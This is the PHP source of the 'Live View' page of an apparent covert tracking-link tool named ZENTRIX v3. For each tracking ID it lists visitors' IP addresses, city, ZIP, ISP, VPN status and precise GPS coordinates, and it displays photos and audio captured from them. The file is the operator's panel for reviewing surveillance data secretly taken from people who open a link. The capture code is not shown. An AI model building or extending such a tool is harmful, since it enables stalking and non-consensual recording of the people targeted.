<?php
/**
 * ZENTRIX v3 – Live View
 * Shows hits + captured photos + audio for a specific tracking ID
 */

$config = require __DIR__ . '/config.php';

$id = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : '';

if (empty($id)) {
    header('Location: index.php');
    exit;
}

$logFile = __DIR__ . '/logs/' . $id . '.json';
$logs = [];

if (file_exists($logFile)) {
    $logs = json_decode(file_get_contents($logFile), true) ?: [];
}

$logs = array_reverse($logs);
$total = count($logs);

// Find photos
$photoDir = __DIR__ . '/logs/photos';
$photos = [];
if (is_dir($photoDir)) {
    $files = glob($photoDir . '/' . $id . '_*.jpg');
    rsort($files);
    $photos = $files;
}

// Find audio files
$audioDir = __DIR__ . '/logs/audio';
$audios = [];
if (is_dir($audioDir)) {
    $files = glob($audioDir . '/' . $id . '_*.{webm,ogg,mp3,wav}', GLOB_BRACE);
    rsort($files);
    $audios = $files;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZENTRIX Live – <?= htmlspecialchars($id) ?></title>
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="assets/js/theme.js"></script>
    <style>
        .photo-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 12px;
            margin-top: 16px;
        }
        .photo-item {
            position: relative;
            border-radius: 10px;
            overflow: hidden;
            border: 1px solid var(--border);
            background: var(--bg-input);
        }
        .photo-item img {
            width: 100%;
            height: 160px;
            object-fit: cover;
            display: block;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .photo-item img:hover {
            transform: scale(1.03);
        }
        .photo-time {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0,0,0,0.65);
            color: #fff;
            font-size: 0.75rem;
            padding: 4px 8px;
            text-align: center;
        }
        .section-title {
            font-size: 1.15rem;
            margin: 32px 0 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .audio-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 16px;
        }
        .audio-item {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .audio-item audio {
            flex: 1;
            height: 36px;
        }
        .audio-meta {
            font-size: 0.82rem;
            color: var(--text-muted);
            min-width: 140px;
        }
    </style>
</head>
<body>
    <div class="bg-grid"></div>

    <header class="topbar">
        <div class="logo">
            <img src="assets/img/logo.png" alt="ZENTRIX Logo">
            <span class="name">ZENTRIX Live</span>
        </div>
        <div style="display:flex; gap:12px; align-items:center;">
            <button id="themeToggle" class="theme-toggle" title="Toggle theme">☀️</button>
            <a href="index.php" class="btn-secondary" style="padding:8px 14px; font-size:0.85rem;">Create Link</a>
            <a href="admin.php" class="btn-secondary" style="padding:8px 14px; font-size:0.85rem;">Admin</a>
        </div>
    </header>

    <div class="container">
        <div style="margin-bottom: 28px;">
            <h1 style="font-size: 1.6rem; margin-bottom: 6px;">
                Tracking ID: <code style="color: var(--success);"><?= htmlspecialchars($id) ?></code>
            </h1>
            <p style="color: var(--text-muted);">
                <?= $total ?> hit<?= $total !== 1 ? 's' : '' ?> · 
                <?= count($photos) ?> photo<?= count($photos) !== 1 ? 's' : '' ?> · 
                <?= count($audios) ?> audio<?= count($audios) !== 1 ? 's' : '' ?>
            </p>
        </div>

        <!-- Photos Section -->
        <?php if (!empty($photos)): ?>
            <div class="section-title">
                <span>Captured Photos</span>
            </div>
            <div class="photo-grid">
                <?php foreach ($photos as $photo): 
                    $basename = basename($photo);
                    $parts = explode('_', $basename);
                    $ts = isset($parts[1]) ? str_replace('.jpg', '', $parts[1]) : '';
                    $timeStr = $ts ? date('Y-m-d H:i:s', (int)$ts) : '';
                    $webPath = 'logs/photos/' . $basename;
                ?>
                    <div class="photo-item">
                        <a href="<?= htmlspecialchars($webPath) ?>" target="_blank">
                            <img src="<?= htmlspecialchars($webPath) ?>" alt="Capture" loading="lazy">
                        </a>
                        <?php if ($timeStr): ?>
                            <div class="photo-time"><?= htmlspecialchars($timeStr) ?></div>
                        <?php endif; ?>
                    </div>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>

        <!-- Audio Section -->
        <?php if (!empty($audios)): ?>
            <div class="section-title">
                <span>Captured Audio</span>
            </div>
            <div class="audio-list">
                <?php foreach ($audios as $audio): 
                    $basename = basename($audio);
                    $parts = explode('_', $basename);
                    $ts = isset($parts[1]) ? preg_replace('/\.(webm|ogg|mp3|wav)$/', '', $parts[1]) : '';
                    $timeStr = $ts ? date('Y-m-d H:i:s', (int)$ts) : '';
                    $webPath = 'logs/audio/' . $basename;
                ?>
                    <div class="audio-item">
                        <div class="audio-meta">
                            <?= htmlspecialchars($timeStr ?: $basename) ?>
                        </div>
                        <audio controls preload="metadata">
                            <source src="<?= htmlspecialchars($webPath) ?>" type="audio/webm">
                            Your browser does not support the audio element.
                        </audio>
                    </div>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>

        <!-- Hits Section -->
        <div class="section-title" style="margin-top: 40px;">
            <span>Hits</span>
        </div>

        <?php if ($total === 0): ?>
            <div class="card" style="text-align: center; padding: 48px 20px;">
                <p style="font-size: 1.1rem; color: var(--text-muted);">No hits yet.</p>
            </div>
        <?php else: ?>
            <?php foreach ($logs as $index => $log): 
                $num = $total - $index;
                $geo = $log['geo'] ?? [];
                $precise = $log['precise'] ?? null;
                $isProxy = !empty($geo['proxy']);
            ?>
                <div class="log-card">
                    <div class="meta">
                        <span class="badge">#<?= $num ?></span>
                        <span><?= htmlspecialchars($log['time'] ?? '-') ?></span>
                    </div>

                    <div class="ip"><?= htmlspecialchars($log['ip'] ?? 'Unknown') ?></div>

                    <div class="loc">
                        <?= htmlspecialchars(($geo['city'] ?? '') . ($geo['city'] && $geo['region'] ? ', ' : '') . ($geo['region'] ?? '')) ?>
                        <?= !empty($geo['country']) ? ' · ' . htmlspecialchars($geo['country']) : '' ?>
                    </div>

                    <div style="margin-top: 8px; font-size: 0.9rem; color: var(--text-muted);">
                        <?php if (!empty($geo['zip'])): ?>
                            ZIP: <?= htmlspecialchars($geo['zip']) ?> ·
                        <?php endif; ?>
                        ISP: <?= htmlspecialchars($geo['isp'] ?? '-') ?>
                        <?php if ($isProxy): ?>
                            <span class="badge proxy" style="margin-left: 8px;">PROXY / VPN</span>
                        <?php else: ?>
                            <span class="badge clean" style="margin-left: 8px;">Clean</span>
                        <?php endif; ?>
                    </div>

                    <?php if ($precise && !empty($precise['lat'])): ?>
                        <div style="margin-top: 10px; padding: 10px 12px; background: rgba(34, 211, 238, 0.08); border-radius: 8px; font-size: 0.9rem;">
                            📍 Precise: 
                            <?= htmlspecialchars($precise['lat']) ?>, 
                            <?= htmlspecialchars($precise['lon']) ?>
                            <?php if (!empty($precise['accuracy'])): ?>
                                (±<?= htmlspecialchars($precise['accuracy']) ?>m)
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>

                    <details>
                        <summary>User-Agent & Details</summary>
                        <pre><?= htmlspecialchars($log['ua'] ?? 'No User-Agent') ?></pre>
                    </details>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>

        <div style="margin-top: 32px; text-align: center;">
            <a href="admin.php" class="btn-secondary">← Back to Admin</a>
        </div>
    </div>
</body>
</html>
